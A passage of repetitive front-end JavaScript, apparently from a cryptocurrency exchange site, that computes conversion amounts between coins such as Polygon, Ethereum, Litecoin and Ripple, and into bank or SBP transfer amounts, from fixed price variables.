                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Polygon (POL)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_POL ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( ( document.querySelector('.first__input-one').value * PRICE_POL ) /  PRICE_BTC ) ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_SOL ).toFixed(2);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_ETH ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETH ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_ARB ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_LTC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_LTC ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_BCH ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BCH ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_XRP ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_TON ).toFixed(2);
